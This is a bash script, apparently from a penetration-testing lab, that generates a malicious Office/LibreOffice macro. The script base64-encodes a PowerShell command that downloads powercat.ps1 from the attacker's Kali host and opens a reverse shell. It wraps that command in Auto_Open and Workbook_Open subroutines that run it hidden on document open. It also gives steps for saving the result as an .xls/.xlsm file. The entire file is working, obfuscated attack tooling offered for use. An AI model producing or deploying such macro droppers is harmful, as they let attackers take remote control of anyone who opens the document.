#!/usr/bin/env bash
# Usage: ./generate_macro.sh kali_ip http_port nc_port
# Output: /tmp/macro.vba

kali_ip="$1"
http_port="$2"
nc_port="$3"

if [ -z "$kali_ip" ] || [ -z "$http_port" ] || [ -z "$nc_port" ]; then
    echo "Usage: $0 kali_ip http_port nc_port"
    echo "Example: $0 192.168.45.248 8000 4444"
    exit 1
fi

# Build + base64-encode payload (UTF-16LE for powershell -e)
ps_cmd="IEX(New-Object System.Net.WebClient).DownloadString('http://$kali_ip:$http_port/powercat.ps1');powercat -c $kali_ip -p $nc_port -e powershell"
b64=$(echo -n "$ps_cmd" | iconv -t UTF-16LE | base64 -w 0)

python3 - "$b64" <<'PYEOF'
import sys, textwrap

b64 = sys.argv[1]
chunks = textwrap.wrap(b64, 50)
str_lines = "\n".join(f'    Str = Str + "{c}"' for c in chunks)

vba = f"""Sub Auto_Open()
    MyMacro
End Sub
Sub Workbook_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
{str_lines}
    CreateObject("Wscript.Shell").Run "powershell -nop -w hidden -e " & Str
End Sub"""

with open("/tmp/macro.vba", "w") as f:
    f.write(vba)

print(vba)
PYEOF

echo ""
echo "[+] Saved to /tmp/macro.vba"
echo "[+] Paste into LibreOffice: Tools -> Macros -> Edit Macros"
echo "    Make sure it's under: YOUR_FILE -> Standard -> Module1"
echo "    Then: File -> Save As -> .xls / .xlsm"
